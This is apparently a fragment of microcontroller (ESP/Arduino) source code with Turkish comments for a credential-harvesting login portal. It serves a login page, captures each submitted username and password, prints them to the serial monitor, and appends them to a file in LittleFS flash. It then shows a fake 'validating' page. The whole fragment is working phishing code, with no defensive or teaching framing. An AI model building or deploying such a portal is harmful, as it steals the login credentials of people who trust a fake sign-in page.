// Yardımcı fonksiyon: Giriş verilerini zararlı karakterlerden arındırır
String sanitizeInput(String inputValue) {
  inputValue.replace("<", "&lt;");
  inputValue.replace(">", "&gt;");
  return inputValue;
}

// LittleFS üzerinde kaydedilen veriyi okur
void readData() {
  File file = LittleFS.open("/SavedFile.txt", "r");
  if (!file) return;
  char buffer[1000];
  int idx = 0;
  while (file.available() && idx < sizeof(buffer) - 1) {
    buffer[idx++] = file.read();
  }
  buffer[idx] = '\0';
  file.close();
  credentialsData = String(buffer);
  if (credentialsData != "") savedData = true;
}

// Veriyi LittleFS'e yazar
void writeData(String data) {
  File file = LittleFS.open("/SavedFile.txt", "w");
  if (file) {
    file.print(data);
    delay(1);
    file.close();
  }
}

// Dosyayı LittleFS üzerinden siler
void deleteData() {
  LittleFS.remove("/SavedFile.txt");
}

// Giriş (login) sayfasını döndürür
String index() {
  return String(casLoginPage);
}

// Form gönderimi sonrası; verileri okur, ekler, Serial'e yazdırır ve validasyon sayfasını döndürür
String posted() {
  String username = sanitizeInput(webServer.arg("username"));
  String password = sanitizeInput(webServer.arg("password"));

  // Seri monitöre yazdırma:
  Serial.println("Yeni giriş yapıldı:");
  Serial.println("Kullanıcı Adı: " + username);
  Serial.println("Parola: " + password);

  readData();  // Önceden kaydedilmiş veri varsa okur

  // Yeni girilen bilgiyi ekliyoruz
  credentialsData += "<li>Kullanıcı: <b>" + username + "</b><br>Parola: <b>" + password + "</b></li>";
  writeData(credentialsData);
  savedData = true;

  return String(casValidatingPage);
}

